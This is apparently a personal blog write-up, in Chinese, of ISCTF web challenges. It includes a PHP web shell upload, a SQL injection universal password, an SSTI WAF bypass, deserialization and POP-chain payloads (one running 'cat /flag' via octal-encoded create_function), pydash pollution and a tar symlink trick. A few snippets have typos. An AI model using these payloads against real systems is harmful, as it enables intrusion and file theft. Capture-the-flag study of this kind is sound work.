---
title: "ISCTF个人复盘"
image: ''
pinned: false
comment: true
published: 2025-12-11
description: "CTF 学习笔记与技术复盘"
category: 知识点
tags: [知识点]
---

文章内出现的所有指令和代码都是我现场手敲的。

# #WEB：难过的bottle

这一题倒不难，在源码中存在一个黑名单封锁了很多指令字符，只留下了flag，小括号，花括号，单引号，双引号。

在所有字母被封锁的情况下，根据python3的特性，如果我们在python3中使用Unicode字符，python3会自动帮我们纠正过来。

而题目的waf却无法封锁这些unicode加粗字符，即我们用一个跟open和read很像的Unicode加粗字母绕过来waf。

然后执行了`{{open('/flag'.read())}}`这个指令。



---



# #WEB：b@by n0t1ce b0ard

这一题是一个已知的漏洞，上网查一下就能明白。

在注册界面的上传头像处，网站源码并没有对上传的文件做后缀或内容的限制，导致我们直接上传一个php文件，内容为

`<?php system($_GET['cmd']); ?>`  

就能黑入网站，拿到了控制权，执行我们想要执行的命令。



---



# #WEB：flag到底在哪

这一题显示403，用curl在访问一下，就能发现题目是限制了我们的权限，导致我们无法访问正常页面，猜测一下存在一个注册用户的地方。

直接访问/admin/login.php，发现登入点，提示账号为admin，逻辑运算符要大写。

直接用sql注入，万能密码，’ OR ‘1’=1

登入成功，发现是个web php文件上传页面。

尝试最简单的，`<?php system("ls -la"); ?>` 发现flag并不在当前目录下。

用 `<?php system("find / -name\"*flag*\"  -type f 2>/dev/null"); ?>` 发现一个/home/flag。

使用 `<?php system("cat /home/flag"); ?>` 直接拿下flag。



---



# #WEB：ezrce

一个简单的php源码，有一个强制我们只能使用字符，小括号等等的preg。

直接传。

`print_r(getcwd());` 发现当前目录为html，距离根目录还有3个上级目录。

直接用`scandir`和`dirname`穿越目录， `print_r(scandir(dirname(dirname(dirname(getcwd())))));`

发现flag就在根目录下。

用 `chdir` 切换目录，然后 `readfile` 拿下flag。

`chdir(dirname(dirnanme(dirname(getcwd()))));readflie(flag)；`



---



# #WEB：来签个到吧

ez的反序列化，观看源码，发现强制post shark=blueshar：的数据接收方式。

根据api.php，检查类型名必须为`ShitMountant` 类

然后存在一个`fetch`的方法用来读取文件。

`fetch`的读取路径为`$url` ,此外如果 `$logger` 如果有值，即调用它的 `write` 方式。

为了使反序列化的php代码简易化，

最终我得到：

```
<?php
class ShitMountant{
	public $url;
	public $logger;
	public function __construct(){
		$this->url='/flag';
		$this->logger=null;
	}
}
$a=new ShitMountant();
echo serialize($a);
?>

```

在找个在线php跑一下，得到我们的反序列数据，然后post传参，再让api.php触发这段反序列化，拿下flag。



---



# #WEB：Who am I

看题目的js，发现存在强制更改type的值，猜测是一个对帐号判断的代码。

注册账号，用bp抓包登入页面，更改type=0，正好进入管理员账号，可以看到后台源码。

发现两个漏洞点。

发现存在 `pydash.set_(Username,password,confirm_password)` 函数可以更改属性。

`render_template(point)` 渲染html时去 `searchpath` 寻找文件。

判断ssti，修改 `operate` 污染 `searchpath`。

使用 `/operate?username=app&password=jinja_loader.searchpath&confirm_password=/`

污染 `search` 使其指向根目录 `/`

随后访问 `/impression?point=flag`

拿下flag。



---



# #WEB：flag？我就借走了

这一题就是借用了题目python解压tar包保留软链接的方式，创建一个指向/flag的软链接，让我们在网站访问软链接时候，误以为我们在访问/flag，拿下flag。

创建link.tar的代码如下：

```
import tarfile
def make_link_tar():
    with tarfile.open('link.tar','w') as tar :

        info1=tarfile.TarInfo('flag.txt')
        info1.type=tarfile.SYMTYPE
        info1.linkname='/flag'
        tar.addfile(info1)

if __name__=='__main__':
    make_link_tar()
```

上传tar文件，访问软链接，拿下flag。



---



# #WEB：Bypass

同样的php加反序列化，靶机给了源码。

有黑名单，禁用几乎所有的指令字符，也就意味着正常命令走不通。

存在一个 `$a("", $b);`，查询后能发现这个的构造很像 `create_function()` ，而且正好这个函数不存在于a的黑名单中。

这个函数的作用是创建一个匿名函数，括号内第一个为参数，第二个为代码。

思路为命令逃逸，用}闭合前面的函数，然后执行 `system('cat /flag')`; 绕过waf使用的是八进制法，将我们的命令字母转化后八进制通过waf，在通过php解析，完成反序列化攻击。

payload构造如下：

```
<?php
class FLAG
{
	public $a;
	public $b;
	public function __construct()
	{
		$this->a="create_function";
		$this->b='} "\163\171\163\164\145\155"("\143\141\164\40\57\146\154\141\147");/*';
	}
}
$payload=new FLAG;
echo urlencode(serialize($payload));
?>

```



---



# #WEB：ezpop

简单pop链，稍微看一下，只要注意哈希碰撞就可以了。

```
<?php
class begin{
    public $var1;
    public $var2;

    public function __construct($a){
        $this->var1=$a;
    }
}
class starlord{ 
    public $var4;
    public $var5;
}
class anna{
    public $var6;
    public $var7;
}
class flaag{
    public $var10;
    public $var11;
}
class eenndd{ 
    public $command;
}


$target = bin2hex("/flag");
$payload = "var_dump(file_get_contents(hex2bin('$target')));die();";


$a = new eenndd();
$a->command = $payload;

$b = new flaag();
$b->var11 = 213;
$b->var10 = $a;

$c = new starlord();
$c->var4 = $b;

$d = new anna();
$d->var6 = $c;

$e = new begin($d);

$f = serialize($e);
echo urlencode($f);
?>
```

这道题的关键其实就是注意一层一层递进的魔术方法，只要按着源码来，是没有问题的。

---

---

---

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
